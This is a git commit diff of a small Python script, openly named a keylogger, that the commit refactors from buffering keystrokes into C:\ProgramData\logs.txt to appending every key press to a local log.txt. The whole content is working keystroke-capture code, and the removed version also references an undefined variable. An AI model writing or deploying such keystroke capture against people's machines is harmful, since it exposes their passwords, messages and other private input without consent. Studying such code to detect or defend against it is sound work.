f0a0bd1f06471dccc7e5b97d54f1703e25e53a05
Lean131X <leandjaramillo@gmail.com>
2025-10-16 18:01:21 -0500

    Refactor keylogger to log key presses to log.txt

--- main.py
+++ main.py
@@ -1,22 +1,14 @@
 import keyboard
-import time 
-teclasguardas = []
-def registrar(tecla ):
-    if tecla == "space": 
-        tecla = " "
-    elif tecla == "enter": 
-        tecla = "[ENTER]"
-    elif len(tecla) > 1: 
-        tecla = f"[{tecla}]"
-    teclasguardas.append(tecla)
-    print(f"Tecla {len(teclasguardas)}: {tecla}el tiempo en que que fue pulsada es: {hora}")
-    print("La cantidad de teclas presionadas es:", len(teclasguardas))
-keyboard.on_press(lambda e: registrar(e.name))
-keyboard.wait('esc')
 
-texto = ""
-for t in teclasguardas:
-    texto += t
-with open(r"C:\ProgramData\logs.txt", "w") as f:
-    f.write(texto)
-print("Registro completo:", texto)
+LOG_FILE = "log.txt"
+with open(LOG_FILE, "a") as f:
+  
+    def on_press(event): 
+        f.write(f"{event.name} ")
+        
+        f.flush()
+
+    keyboard.on_press(on_press)
+    
+    print(f" Keylogger iniciado. Registrando en: {LOG_FILE}. Presiona Ctrl+C para detener.")
+    keyboard.wait()
